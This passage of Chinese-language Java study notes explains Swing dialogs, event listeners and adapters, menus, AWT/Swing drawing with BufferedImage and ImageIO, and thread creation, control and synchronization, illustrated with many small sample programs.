			MainFrame.setVisible(true);
		}
	}


`Window`容器有两个子类：`Frame`、`Dialog`。
`Swing`中容器：`JFrame`、`JDialog`。  
`JDialog`：本质上对话框也是一个窗口，区别在于对话框必须属于某一个窗口。对话框是一个容器，里面可以放各种组件。  
创建对话框需要指定的参数：  
1.`owner`  
2. `title`  
3. 是否`modal`：如果是模式对话框，那么该对话框出现的时候，其`ower`不能得到焦点。否则就是非模式对话框。

对话框使用示例：
>
	import java.awt.*;
	import javax.swing.*;
	import java.awt.event.*;
	public class SwingDialogTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a container
			JFrame MainFrame = new JFrame("hello");
			MainFrame.setBounds(100,200,300,400);
			//MainFrame.setLayout(new FlowLayout(10,10,10));
			BorderLayout bl = new BorderLayout(40,40);
>
			JButton jbu1 = new JButton("yes");
			JButton jbu2 = new JButton("no");
			JButton jbu3 = new JButton("cancel");
			MainFrame.setLayout(new FlowLayout());
			MainFrame.add(jbu1);
			MainFrame.add(jbu2);
			MainFrame.add(jbu3);
>		
			final JDialog jd1 = new JDialog(MainFrame,"yes",true);
			final JDialog jd2 = new JDialog(MainFrame,"no",false);
			final JDialog jd3 = new JDialog(MainFrame,"yes",true);
>		
			//add button action react for button1 with anonymous class
			jbu1.addActionListener(new ActionListener()
			{
				public void actionPerformed(ActionEvent e)
				{
					System.out.println("yes");
					//show the dialog
					jd1.setVisible(true);
				}
			});
>		
			//add button action react listener for button2 with anonymous class
			jbu2.addActionListener(new ActionListener()
			{
				public void actionPerformed(ActionEvent e)
				{
					System.out.println("no");
					//show the dialog
					jd2.setVisible(true);
				}
			});
>		
			//add button action react for button3 with anonymous class
			jbu3.addActionListener(new ActionListener()
			{
				public void actionPerformed(ActionEvent e)
				{
					System.out.println("cancel");
					//show the dialog
					jd3.setVisible(true);
				}
			});
>		
			MainFrame.setVisible(true);
		}
	}


还有两个特殊的对话框：
`JColorChooser`、`JFileChooser`:颜色选择对话框与文件选择对话框。

文件选择对话框使用示例：
>  
	import java.awt.*;
	import javax.swing.*;
	import java.awt.event.*;
	import java.nio.file.*;
	import java.io.*;
	public class SwingFileDialogTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a container
			final JFrame MainFrame = new JFrame("hello");
			MainFrame.setBounds(100,200,300,400);
			//MainFrame.setLayout(new FlowLayout(10,10,10));
			BorderLayout bl = new BorderLayout(40,40);
>
			JButton jbu3 = new JButton("Choose");
>	
			MainFrame.add(jbu3,BorderLayout.SOUTH);
>		
			//add button action react for button3
			jbu3.addActionListener(new ActionListener()
			{
				public void actionPerformed(ActionEvent e) 			{
					try
					{
						SwingDialogTest.readFile(MainFrame);
					}
					catch(Exception m)
					{
						System.out.println("Error");
					}
				}
			});
			MainFrame.setVisible(true);
		}
>	
		static void readFile(Component c) throws Exception
		{
			JFileChooser jfc = new JFileChooser();
			jfc.showOpenDialog(c);
			File f = jfc.getSelectedFile();
>		
		 	if(f!=null)
			{ 
				//read the file with notepad
				Runtime rt = Runtime.getRuntime();
				rt.exec("notepad "+f.getPath());
>		
			 	//read the line in the CMD line
				InputStreamReader isr = new InputStreamReader(new FileInputStream(f)); 
				BufferedReader br = new BufferedReader(isr);
				String tempstr = null;
				while((tempstr=br.readLine())!=null)
				{
					System.out.println(tempstr);
				}  
>		
				//read the line in the textarea
				JTextArea jtp = new JTextArea();
				JFrame jf = (JFrame)c;
				jf.add(new JScrollPane(jtp));
>	
				InputStreamReader isr1 = new InputStreamReader(new FileInputStream(f)); 
				BufferedReader br1 = new BufferedReader(isr1);
				String tempstr1 = null;
				while((tempstr1=br1.readLine())!=null)
				{
					jtp.append(tempstr1+"\n"); 
				}  
			}
		}
	}


注：怎样为一个抽象类创建对象？  
使用匿名内部类即可，使用内部类创建一个该抽象类的子类的匿名对象。然后让这个抽象类引用变量去引用这个子类的匿名对象。  

Java中的事件编程
-----------
针对的就是程序与人的交互---通过鼠标、键盘触发事件。
Java的事件处理模式：委托式的事件处理。
委托式事件处理模型：  
1. 在这种处理模型之下，事件源（如按钮）发生事件（点击）的时候，事件源不处理事件。  
2. 事件源会发出事件（`Event`）给事件监听器（`Listener`）：也就是发送了事件发生点等关于该事件的详细信息。  
3. 事件监听器（`Listener`）获得事件信息（`Event`对象），只能依据事件信息对象（`Event`）对事件进行反应处理。  
4. 事件监听器都要实现一个特定的方法。


事件源：一切组件都可能是事件源。
  
事件：无需程序员理会，事件发送过程也无需理会。
  
监听器：需要程序员实现，通过匿名内部类获得一个监听器的对象。需要实现相应的接口。  
**对于不同的事件，有不同的监听器。**需要为事件源上发生的不同的事件注册与之对应的事件监听器，也就是说一个事件源可以被多个事件监听器监听，一个事件监听器也可以监听多个事件源。  
事件编程的重点就是实现事件处理的方法。  
可以简化为匿名内部类。经常使用的是匿名内部类。
单击事件：`ActionEvent`。

下例中使用了*内部类*，还可以使用*匿名内部类*。
单击监听器： `ActionListener`
单击事件处理示例：
>
	import java.awt.*;
	import javax.swing.*;
	import java.awt.event.*;
	public class SwingActionlistenerTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a container
			JFrame MainFrame = new JFrame("hello");
			MainFrame.setBounds(100,200,300,400);
			//MainFrame.setLayout(new FlowLayout(10,10,10));
			BorderLayout bl = new BorderLayout(40,40);
>		
			//create your own actionlintener for click and implements the reaction func
			class MyEventListener implements ActionListener
			{
				public void actionPerformed(ActionEvent e) 
				{
					System.out.println(e.getActionCommand());				
					System.out.println(e.getWhen());
				}
			}
>		
			JButton bu1 = new JButton("Yes");
			JButton bu2 = new JButton("No");
			//add the actionlistener for your buttons
			bu1.addActionListener(new MyEventListener());
			bu2.addActionListener(new MyEventListener());
>		
			MainFrame.add(bu1,BorderLayout.NORTH);
			MainFrame.add(bu2,BorderLayout.SOUTH);
			MainFrame.setVisible(true);
		}
	}

注：`Event`类是属于`AWT`的。
IM：无论是我们通过`implements`来实现监听器接口获得监听器对象还是通过匿名内部类来获得监听器对象，都需要实现监听器接口中的**所有抽象方法**，即使有些只是空实现。
这样就导致，当监听器接口里的方法过多的时候，需要程序员实现这个接口里面的所有方法，导致监听器过于臃肿。  
于是就出现了适配器，适配器是监听器的实现类。它为监听器接口提供了通实现。也即是说，采用适配器之后，我们不需要的接口里的方法可以不用自己去实现，只用实现自己想要实现的方法。  
对于方法很多的事件监听器接口，都会为它提供对应的事件适配器。 

窗口监听器：
对任何一个窗口（`Frame`或者`Dialog`都适用)监听。

窗口监听器使用示例：
>
	import java.awt.*;
	import javax.swing.*;
	import java.awt.event.*;
	public class SwingWindowActionListenerTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a container
			final JFrame MainFrame = new JFrame("hello");
			MainFrame.setBounds(100,200,300,400);
			//MainFrame.setLayout(new FlowLayout(10,10,10));
			BorderLayout bl = new BorderLayout(40,40);
>
			//add windowlistener
			MainFrame.addWindowListener(new WindowListener()
			{
				//implements the window funcs all	
				public void windowClosing(WindowEvent e) 			
				{
					try
					{
						System.out.println("hi");
						int result = JOptionPane.showConfirmDialog(MainFrame, 	"yes?"); 
						if(result==0)
						{	 
							System.exit(0);
						}
					}
					catch(Exception d)
					{
						System.out.println("error");
					}
				}
				public void windowActivated(WindowEvent e) 
				{}
				public void windowClosed(WindowEvent e) 
				{}
>			
				public void windowDeactivated(WindowEvent e) 
				{}
				public void windowDeiconified(WindowEvent e) 
				{}
				public void windowIconified(WindowEvent e) 
				{}
				public void windowOpened(WindowEvent e) 
				{}
			});
			MainFrame.setVisible(true);
		}
	}

窗口适配器使用示例：
>
	import java.awt.*;
	import javax.swing.*;
	import java.awt.event.*;
	public class SwingWindowActionAdapterTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a container
			final JFrame MainFrame = new JFrame("hello");
			MainFrame.setBounds(100,200,300,400);
			//MainFrame.setLayout(new FlowLayout(10,10,10));
			BorderLayout bl = new BorderLayout(40,40);
>	
			//add windowlistener
			MainFrame.addWindowListener(new WindowAdapter()
			{
				//implements the window close raction only the funcs you want
				public void windowClosing(WindowEvent e) 			
					{
					try
					{
						System.out.println("hi");
						int result = JOptionPane.showConfirmDialog(MainFrame, "yes?"); 
						if(result==0)
						{	 
							System.exit(0);
						}
					}
					catch(Exception d)
					{
						System.out.println("error");
					}
				}
			});
			MainFrame.setVisible(true);
		}
	}


各种事件与接口对应：  
1. `Action`：`ActionListener`：单击事件  
2. `Item`：`ItemListener`：  
3. `Mouse Motion`：`MouseMotionListener`：鼠标动作事件  
4. `Mouse`：`MouseListener`：鼠标按键事件  
5. `Key`：`KeyListener`：按键事件  
6. `Focus`：`FocusListener`：焦点事件  
7. `Text`:`TextListener`:文本框、文本域事件


Java中的菜单
-----------
`AWT`菜单：`MenuComponent`,一切菜单组件都是`MenuComponent`。见类结构图。  
`MenuBar`：就是一整个工具条。包含多个`Menu`，`Menu`包含多个`MenuItem`。

`Swing`菜单：比`AWT`菜单功能更强大。比如，Swing菜单支持图标菜单。  
`JMenuBar`:工具条。包含多个JMenu，JMenu包含多个`JMenuItem`。  
由于`JMenu`继承自`JMenuItem`，所以，`JMenu`可以当`JMenuItem`使用。  
`JFrame`使用`setJMenuBar(JMenuBar menubar)`来安装菜单工具条。
`JMenu`可以`add(JMenuItem j)`也可以`add(JMenu j)`,这样就可以产生二级菜单,也就是说，`JMenu`可以当成`JMenuItem`使用.  

同样可以为菜单项（MenuItem）添加监控器。  

菜单使用示例：

>
	import java.awt.*;
	import javax.swing.*;
	import java.awt.event.*;
	public class SwingJMenuTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a container
			JFrame MainFrame = new JFrame("hello");
			MainFrame.setBounds(100,200,300,400);
			BorderLayout bl = new BorderLayout(40,40);
>	
			//construct the menubar
			JMenuBar jmb = new JMenuBar();
>		
			//construct the menus for the menubar	
			JMenu jm1 = new JMenu("Files",true);
			JMenu jm2 = new JMenu("Edit",true);
			JMenu jm3 = new JMenu("Search",true);
			JMenu jm4 = new JMenu("Runs",true);
			JMenu jm5 = new JMenu("Language",true);
			jmb.add(jm1);
			jmb.add(jm2);
			jmb.add(jm3);
			jmb.add(jm4);
			jmb.add(jm5);
>			
			//construct the menuitems for the menu
			JMenuItem jmi1 = new JMenuItem("1");
			JMenuItem jmi2 = new JMenuItem("2");
			JMenu jmi3 = new JMenu("3");
			JMenuItem jmi4 = new JMenuItem("4");
			jmi1.setAccelerator(KeyStroke.getKeyStroke('V',InputEvent.CTRL_DOWN_MASK)); 
			jm1.add(jmi1); 
			jm1.add(jmi2);
			//add separator in the menu
			jm1.addSeparator(); 
			jm1.add(jmi3); 
			jmi3.add(jmi4); 
>		
			//add ActionListener for the menuitem
			jmi1.addActionListener(new ActionListener()
			{
				public void actionPerformed(ActionEvent e)
				{
					System.out.println("hi");
				}
			});
			//add the menubar onto the frame
			MainFrame.setJMenuBar(jmb);
			MainFrame.setVisible(true);
		}
	}

为文本域添加监控器：文本域监控器来自`javax.swing.event.*`包。  
使用`DocumentListener`来监听文本框内容的改变。

文本域监控使用示例：

>
	import java.awt.*;
	import javax.swing.*;
	import java.awt.event.*;
	import javax.swing.event.*;
	public class SwingJMenuTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a container
			JFrame MainFrame = new JFrame("hello");
			MainFrame.setBounds(100,200,300,400);
			BorderLayout bl = new BorderLayout(40,40);
>	
			//construct the menubar
			JMenuBar jmb = new JMenuBar();
>		
			//construct the menus for the menubar	
			JMenu jm1 = new JMenu("New",true);
			JMenu jm2 = new JMenu("Save",true);
			JMenu jm3 = new JMenu("Search",true);
			JMenu jm4 = new JMenu("Runs",true);
			JMenu jm5 = new JMenu("Language",true);
			jmb.add(jm1);
			jmb.add(jm2);
			jmb.add(jm3);
			jmb.add(jm4);
			jmb.add(jm5);
>		
			//construct the menuitems for the menu
			JMenuItem jmi1 = new JMenuItem("1");
			JMenuItem jmi2 = new JMenuItem("2");
			JMenu jmi3 = new JMenu("3");
			JMenuItem jmi4 = new JMenuItem("4");
			jmi1.setAccelerator(KeyStroke.getKeyStroke('N',InputEvent.CTRL_DOWN_MASK)); 
			jmi2.setAccelerator(KeyStroke.getKeyStroke('S',InputEvent.CTRL_DOWN_MASK)); 
			jm1.add(jmi1); 
			jm1.add(jmi2);
			//add separator in the menu
			jm1.addSeparator(); 
			jm1.add(jmi3); 
			jmi3.add(jmi4); 
>		
			final JTextArea jta = new JTextArea(60,80);
			//add ActionListener for the menuitem
			jmi1.addActionListener(new ActionListener()
			{
				public void actionPerformed(ActionEvent e)
				{
					System.out.println("hi");
				}
			});
			   boolean isModified = false;
			jta.getDocument().addDocumentListener(new DocumentListener(){
>			
				public void changedUpdate(DocumentEvent e) 
				{
				}
				public void insertUpdate(DocumentEvent e) 
				{
					System.out.println("insert");
				}
				public void removeUpdate(DocumentEvent e) 
				{
					System.out.println("remove");
				}
			});
>		
			MainFrame.add(jta,BorderLayout.CENTER);
			//add the menubar onto the frame
			MainFrame.setJMenuBar(jmb);
			MainFrame.setVisible(true);
		}
	}	


上、下文菜单：也就是右键菜单。  
`JPopupMenu`:是整个上、下文菜单的容器。

画图：  
前面的组件是`Swing`帮我们完成的。实际上那些组件都是JDK的开发者帮我们画上去的。  
如果想要界面组件更多，就需要自己来绘制。
  
`AWT`绘图：  
需要创建`Canvas`或者`Panel`，然后重写它的`onPaint(Graphic g)`方法。
`Graphic`相当于画笔，所有的内容都是通过它绘制出来的。  
`Canvas`与`Panel`都是空白的“矩形区域”容器。往里面画什么就有什么。二者几乎是一样的，

`Swing`绘图：   
使用的`JPanel`也是一个空白区域，但是多了一个“双缓冲机制”。  
双缓冲：当我们要在某一个“组件”上绘制图形的时候，先在内存中绘制一个图形，然后将图形整体绘制在组件上。这样就避免在“组件”上一笔一笔地画（每一笔都会导致组件的一次刷新，导致组件闪烁）图形，提高了性能。


注：由于`main`方法是`static`方法，导致在`main`方法中不能调用类中的非`static`方法与`static`域，因此这个时候要将这些方法、域设置为`static`的。但往往并不能如此将他们都设置为`static`的。  
这个时候，有一种处理方式：  
在`main`方法外创建一个非`static`方法，然后在这个非`static`方法中调用想要的非`static`方法与域。最后在`main`方法中创建一个类对象，通过这个类对象调用前面创建的那个非`static`方法。

上例是使用`AWT`绘图使用示例：  
>
	import java.awt.*;
	import java.awt.event.*;
	import java.util.*;
	public class AWTDrawingTest
	{
		private Frame mainFrame = new Frame();
		private String RECT_shape = "rect";
		private String OVAL_shape = "oval";
		private String shapeToDraw = "";
		private MyCanvas drawArea = new MyCanvas();
		class MyCanvas extends Canvas
		{
			public void paint(Graphics g) 
			{
				Random rand = new Random();
				if(shapeToDraw.equals(RECT_shape)==true)
				{
					g.drawRect(rand.nextInt(200),rand.nextInt(200),50,50); 	
			}
>
				if(shapeToDraw.equals(OVAL_shape)==true)
				{
					g.drawOval(rand.nextInt(200),rand.nextInt(200),50,50); 	
				}
			}
		}
>
		public void init()
		{
			Button ButtRect = new Button("rect");
			Button ButtOval = new Button("oval");
			Panel MyPanel = new Panel();
			ButtRect.addActionListener(new ActionListener(){
				public void actionPerformed(ActionEvent e) 
				{
					shapeToDraw = RECT_shape;
					drawArea.repaint();	
				}	
			});
>
			ButtOval.addActionListener(new ActionListener(){
				public void actionPerformed(ActionEvent e) 
				{
					shapeToDraw = OVAL_shape;
					drawArea.repaint();	
				}	
			});
>
			MyPanel.add(ButtRect);
			MyPanel.add(ButtOval);
			drawArea.setPreferredSize(new Dimension(300,300));
			mainFrame.add(MyPanel);
			mainFrame.add(drawArea,BorderLayout.SOUTH);
			mainFrame.pack();
			mainFrame.setVisible(true);
		}
		public static void main(String[] args)
		{
			new AWTDrawingTest().init();	
		}
	}  


注：用**抽象类或者接口**创建对象时，都是	使用**内部类或者匿名内部类。**

注：在类内部，不能在方法之外的区域调用方法。只能在方法之内调用其他方法，也就是说，不能在放`Field`的区域内出现方法的调用语句。


所谓的真彩色，就是32位颜色。分别为`RGBA`(红、绿、蓝、透明度)。每个基本色有256(2的8次方)种，共有2的32次方种。`BMP`是没有压缩的格式。  

`BufferedImage`使用：
`BufferedImage`对象`Image`相当于在内存中绘制一张图片。然后通过该对象的`getGraphics()`方法获得`Graphics`对象`ps`，也就是内存中这张图片`Image`的画笔。  
在后面的方法中，都是使用这个`ps`对象的各种方法将所有图形绘制在内存中的`BufferedImage`对象`Image`上（这里使用的画笔是内存中的那张图片的画笔）。  
然后在`paint()`方法的重写中，直接使用这个`Graphics`对象`g`来进行调用`drawImage()`方法绘制（就是将内存中的`Image`对象绘制在我们的显示组件`Canvas`上），这里使用的是显示组件的画笔`g`是`Canvas`的画笔而不是使用原来内存中的那张图片`Image`的画笔`ps`进行绘制。

`BufferedImage`使用示例：

>
	import java.awt.*;
	import java.awt.event.*;
	import java.util.*;
	import java.awt.image.*;
	public class AWTBufferedImageDrawingTest
	{
		private Frame mainFrame = new Frame();
		private String RECT_shape = "rect";
		private String OVAL_shape = "oval";
		private String shapeToDraw = "";
		private MyCanvas drawArea = new MyCanvas();
		BufferedImage Image = new BufferedImage(300,300,BufferedImage.TYPE_INT_RGB);
		private Graphics ps = Image.getGraphics();
		class MyCanvas extends Canvas
		{
			public void paint(Graphics g) 
			{
				g.drawImage(Image,0,0,null);
			}
		}
>
		public void init()
		{
			Button ButtRect = new Button("rect");
			Button ButtOval = new Button("oval");
			Panel MyPanel = new Panel();
			ButtRect.addActionListener(new ActionListener(){
				public void actionPerformed(ActionEvent e) 
				{
					Random rand = new Random();
					ps.drawRect(rand.nextInt(200),rand.nextInt(200),50,50); 	
					drawArea.repaint();	
				}	
			});
>
			ButtOval.addActionListener(new ActionListener(){
				public void actionPerformed(ActionEvent e) 
				{
					Random rand = new Random();
					ps.drawOval(rand.nextInt(200),rand.nextInt(200),50,50); 	
					drawArea.repaint();	
				}	
			});
			mainFrame.setBounds(0,0,300,300);
			MyPanel.add(ButtRect);
			MyPanel.add(ButtOval);
			MyPanel.setBackground(new Color(255,0,0)); 
			drawArea.setPreferredSize(new Dimension(300,300));
			mainFrame.add(MyPanel);
			mainFrame.add(drawArea,BorderLayout.SOUTH);
			mainFrame.pack();
			mainFrame.setVisible(true);
		}
		public static void main(String[] args)
		{
			new AWTBufferedImageDrawingTest().init();	
		}
	}  



可以使用`ImageIO`类将图片读、取在磁盘上的专用类。前面的`BufferedImage`类是将图片在内存中放置。这个`ImageIO`类是将图片在磁盘上输入、输出。

`Graphics`类可以对图形进行处理，如、旋转等。它是`Graphics`类的子类。可用于验证码的产生。

`ImageIO`及`Graphics`类使用示例：

>
	import java.awt.*;
	import javax.swing.*;
	import java.util.concurrent.*;
	import java.awt.image.*;
	import javax.imageio.*;
	import java.io.*;
	import java.util.*;
	public class AWTImageIOTest
	{
		public static void main(String[] args) throws Exception
		{
			ThreadLocalRandom rand = ThreadLocalRandom.current();
			BufferedImage image = new BufferedImage(200,150,BufferedImage.TYPE_4BYTE_ABGR );
			Graphics ps = image.getGraphics();
			//use Graphics2D to ratota the image
			Graphics2D pd = (Graphics2D)ps;
			pd.setColor(new Color(255,0,0)); 
			pd.setBackground(new Color(255,0,0));
			int x=40;
			for(int i=1;i<=6;i++) 
			{
			 	//get the char by random
				char ch = (char)rand.nextInt(65,65+26); 
				double ang = rand.nextDouble(Math.PI/12,Math.PI/6);
				//rotate the pd
				pd.rotate(ang,x,80); 
				//draw the char on the image
				pd.drawString(""+ch, x, 60); 
				//recover the pd
				pd.rotate(-ang,x,80); 
				x=x+20;
			}
>		
			pd.setColor(new Color(0,0,0)); 
			for(int j=0;j<100;j++)
			{
				int xStart = rand.nextInt(20,180);
				int yStart = rand.nextInt(10,130);
				int xEnd = rand.nextInt(60,180);
				int yEnd = rand.nextInt(30,140);
				pd.drawLine(xStart,yStart,xEnd,yEnd);
			}
			ImageIO.write(image,"png",new File(UUID.randomUUID	()+"1.png"));
		}
	}

Java中的进程与线程
--------------
进程：运行中的程序。  
1. 进程是系统中一个独立存在的实体，拥有自己独立的资源、内存区。一个进程的内存空间*一般是不能允许*其他进程访问。  
2. 动态性。程序是静止的，运行起来才叫进程。  
3. 并发性。操作系统中可以同时"并发（concurrent）"。可以运行多个进程。

线程：进程中并发执行流，也叫light-weight Process。没有自己独立的内存、资源。而是和其他的线程共享。

进程的创建成本比线程要高。

并发（`concurrent`）：即使**只有一个CPU**，多个进程或者线程在这个CPU上**快速轮换**地执行。
在任何时刻，只有与CPU个数相同的进程在真正的执行，其他的进程都处于等待状态。但是人是感受不到这个等待。

并行（`parallel`）：必须有**一个以上的CPU**，在同一时刻至少有与`CPU`个数相同的进程在执行。这些**同时**（而不是快速轮流）执行。这才是真正的同时执行。这些进程就是并行执行。
 
多线程的好处：  
1. 功能上，多线程类似于多进程  
2. 创建成本低、效率高。  
3. 线程之间通信方便，无需使用管道流。  
4. `Java`语言的多线程很优秀。

`Java`中创建多线程的方法：  
1. 继承`Thread`类以创建多线程。
   注：线程执行体：就是该线程将要做的事情。`run()`方法里面也就是要执行的代码。
   `Thread`这个类就是线程类。代表着线程。
   `Thread`类最重要的方法是`run()`，它为`Thread`类的方法`start()`所调用，提供我们的线程所要执行的代码。为了指定我们自己的代码，只需要覆盖它！
   `main()`方法本身就是一个主线程。它是默认已启动的线程。我们在`main()`方法之外创建我们自己想要的任意线程，然后在`main()`方法这个主线程里面使用`start()`方法启动这些线程。
a. 继承`Thread`类。重写一个`run()`方法。这个`run()`方法就是线程执行体。里面就是我们要在这个线程里面做的事情。  
   这个`run()`方法不能有返回值，也不能抛出异常。 	
   
b. 在`run()`方法内加入我们要在本线程中执行的代码。例如：通过`Thread`类的`currentThread()`这个静态方法获得当前在运行的线程。 

c. 调用`Thread`对象(`new`一个`Thread`对象即是创建一个线程)的`start()`方法启动线程，而不能调用`run()`方法。每`start()`一次都创建了一个新线程并运行一次`run()`方法。因此，如果想在不同线程中执行不同的代码，就需要在`run()`方法中针对不同的线程名再调用不同的代码即可。
实际上就是创建一个我们的类对象(线程对象)，然后用这个类对象调用它的`start()`方法，因为它已经继承了`Thread`类，所以它有`start()`方法。

`Thread`使用示例：
>
	public class  ThreadTest extends Thread
	{
		public void f(String str)
		{
			System.out.println(str);
		}
		//run method includes the code you want to exec in the current Thread. 
		public void run()
		{
			//for different thread exec the different func
			f(Thread.currentThread().getName());
		}
		//the main thread
		public static void main(String[] args) 
		{
			for(int i=0;i<100;i++)
			{
				//construct a new thread and run it
				new ThreadTest().start();
			}
>		
			System.out.println(Thread.currentThread().getName());
		}
	}

2. 实现`Runnable`接口
a. 实现`Runnable`接口。重写`run()`方法。`run()`里面即是我们想要执行的代码。  
b. 由于`Runnable`接口中并没有`start()`方法,因此只能将`Runnable`对象包装成`Thread`对象(线程对象)才能调用`start()`方法以创建线程并启动。

`Runnable`接口使用示例：
>
	public class  RunnableImplementsTest implements Runnable
	{
		//run method includes the code you want to exec in the current Thread. 
		public void run()
		{
			//for different thread exec the different func
			System.out.println(Thread.currentThread().getName());
		}
		//the main thread
		public static void main(String[] args) 
		{
			for(int i=0;i<100;i++)
			{
				//construct a new thread and run it
				(new Thread(new RunnableImplementsTest())).start();
			}
			System.out.println(Thread.currentThread().getName());
		}
	}

3. 实现`Callable<V>`接口  
   由于前两种方法中，`run()`方法都不能有返回值。所以我们可以实现`Callable<V>`接口，让我们执行的代码具有返回值。这个接口就是`Runnable`接口的增强版。它可以有返回值，还可以抛出异常。
a. 实现`Callable<V>`接口，其中的`V`是我们要执行的代码返回的值类型。重写`call()`方法。该方法具有返回值，还可以抛出异常。  
b. 创建并启动线程的时候，要先将`Callable`对象包装成`Runnable`对象，然后将`Callable`对象包装成`Runnable`对象（由于`Runnable`只是一个接口，需要将`Callable`对象包装成`Runnable`接口的*实现类对象*,实际上就是先将`Callable`对象包装成`FutureTask<V>`对象)，然后将`Runnable`的实现类对象`FutureTask<V>`对象包装成`Thread`对象，然后用`Thread`对象的`start()`方法来创建并启动新线程。  
c. 调用`FutureTask<V>`对象的方法`get()`来获得`call()`方法里的返回值。

`Callable<V>`使用示例：
>
	import java.util.concurrent.*;
	public class  CallableImplementsTest implements Callable<String>
	{
		//run method includes the code you want to exec in the current Thread. 
		public String call() throws Exception 
		{
			//for different thread exec the different func
			return Thread.currentThread().getName();
		}
		//the main thread
		public static void main(String[] args) throws Exception
		{
			for(int i=0;i<100;i++)
			{
				//construct a new thread and run it
				CallableImplementsTest  cit= new CallableImplementsTest();
				FutureTask<String> ft = new FutureTask<String>(cit);
				new Thread(ft).start();
				System.out.println(ft.get());
			}
			System.out.println(Thread.currentThread().getName());
		}
	}

IM经验：当我们要向一个方法中传入一个参数，但是实际上我们有的实参的类型不与之匹配，那么就去看看这个方法中参数的类是否有子类，我们是否可以将我们已有的实参包装成这个方法所要求的参数类型的子类，然后将包装而得的子类对象传给这个方法即可。所以我们编程的时候，对于方法，往往要注意对接口编程，就是将方法中的形参数类型设为接口或者其他的抽象类，以保证使用时可以传入更多的类型实参。
  
实际上，在`Java`中，需要一个接口的对象、需要一个抽象类的对象、需要一个类的对象，都可以视作需要这个接口的实现类（非抽象的）对象、需要这个抽象类的实现类（非抽象的）的对象，需要这个类的子类的对象。

创建线程的方式的对比，创建线程方式分为两类：  
1. 继承`Thread`类。  
2. 实现`Runnable`或者`Callable`接口。  
实现接口的方式更好。原因：  
1. 继承了`Thread`类后就不能继承其他的类了，但是实现了接口之后还可以继承别的类。  
2. 实现接口可以让多个`Thread`对象在创建的时候可以共享同一个`Runnable`对象。更好地实现代码与数据的分离，逻辑更清晰。  
3. 实现接口的缺点：编码略微复杂。


线程的状态：  
当调用`start()`之后，只是启动线程，并没有立即执行线程(没有立即执行`run`方法)。  
新建状态：`new`了一个`Thread`对象(线程对象)后即是新建状态。该线程对象只是一个`Java`对象。
  
就绪状态：调用`start()`后处于就绪状态。
  
运行状态：从就绪到运行状态之间是不可控的，这里依靠系统的线程调度器进行分配，是一个随机的分配。  
如果Thread调用静态方法`sleep(int time)`，就会让当前线程进入阻塞状态`time`长时间，`CPU`会在中止的这段时间内运行其他的线程。  
如果`Thread`调用静态方法`yield()`,就会让当前线程让出`CPU`，处于就绪状态。

阻塞状态(`Blocked`)：如`Thread`执行`sleep`之后，当前线程就会进入阻塞状态。进入阻塞状态之后，当`sleep`时间完成之后，线程离开阻塞状态，进入就绪状态。然后，系统再自己让这个就绪状态的线程进入运行状态。

以上状态转换见*Thread Status状态图*。


控制线程的几个基本方法：  
1. `join()`线程。启动多条线程之后，调用`join()`的线程要先完成以后（调用`join()`的线程死亡之后才行），剩下的线程才能继续往下执行。  
2. 后台线程。也就是`Daemon Thread`。也叫守护线程。因为它的特征是：如果所有的前台线程结束，它会自动死亡。作用是监控前台线程，为前台线程服务。可以将某个线程设为后台线程。那么其他线程都结束之后，它就会死亡。  
3. 线程暂停。`Thread.sleep(100)`:让线程暂停100ms，进入阻塞状态。暂停完成之后，就会进入就绪状态，然后由系统分配`CPU`。  
4. 线程让步。`Thread.yield()`:让出`CPU`，进入就绪状态。在执行了`yield()`之后，就会让系统再次进行`CPU`分配，可能刚刚让出`CPU`的线程再次被分配到了`CPU`，继续执行。  
一般使用`sleep()`而不使用`yield()`，因为前者更稳定。  
5. 改变线程优先级：线程优先级越高，线程就会获得更多被执行的机会。`setPriority(int value)`方法。


`join`使用示例：
>
	public class  ThreadJoinTest extends Thread
	{
		public void run()
		{
			for(int i=0;i<100;i++)
			{
				System.out.println(Thread.currentThread().getName()+"----"+i);
			}
		}
		//the main thread
		public static void main(String[] args) throws Exception
		{
			for(int i=0;i<100;i++)
			{
				System.out.println(Thread.currentThread().getName()+"-----"+i);
				//construct new thread 
				ThreadJoinTest t1 = new ThreadJoinTest();
				ThreadJoinTest t2 = new ThreadJoinTest();
				if(i==20)
				{
					t1.start();
					t2.start();
>				
					t1.join();
					t2.join();
				}
			}
		}
	}



`Daemon Thread`使用示例：
>
	public class  DeamonThreadTest extends Thread
	{
		public void run()
		{
			for(int i=0;i<100;i++)
			{
				System.out.println(Thread.currentThread().getName()+"----"+i);
			}
		}
		//the main thread
		public static void main(String[] args) throws Exception
		{
				//construct new thread 
				DeamonThreadTest t1 = new DeamonThreadTest();
				//set the thread t1 as Deamon Thread after the main thread ends it will also die
				t1.setDaemon(true); 				
				t1.start();
				System.out.println(Thread.currentThread().getName()+"-----"+"ends");
		}
	}


`setPriority`使用示例：

>
	public class  ThreadPriortityTest extends Thread
	{
		public void run()
		{
			for(int i=0;i<100;i++)
			{
				System.out.println(Thread.currentThread().getName()+"----"+i);
			}
		}
		//the main thread
		public static void main(String[] args) throws Exception
		{
				//construct new thread 
				ThreadPriortityTest t1 = new ThreadPriortityTest();
				ThreadPriortityTest t2 = new ThreadPriortityTest();
				//set the priority of the threads
				t1.setPriority(Thread.MAX_PRIORITY); 	
				t2.setPriority(Thread.MAX_PRIORITY-1); 	
				t1.start();
				t2.start();
		}
	}

线程同步：
如：银行账户取钱问题，如果是多线程的话，可能多个人同时取款，会超额取钱。  
竞争资源（共享资源）：如果多个线程需要并发访问、并修改某个对象，该对象就是竞争资源。
因此就需要控制线程安全，线程安全的方法有：  
1. 同步代码块：需要显式指定同步监视器。  
2. 同步方法:不需要显式指定同步监视器。只需要在要作为原子方法的方法前加上`synchronized`标示符即可。其相当于使用方法的调用者作为*同步监视器*。如果方法是示例方法，相当于`this`就是同步监视锁。如果方法是类方法，相当于这个类就是同步监视锁。  

为避免多个线程“自由竞争”修改共享资源导致的不安全问题。于是考虑对资源进行“加锁”。  
以上两种方法的实现机制：当程序要进入某个被“同步监视锁”所监视的代码之前，本线程必须先去获得“同步监视锁” 。  
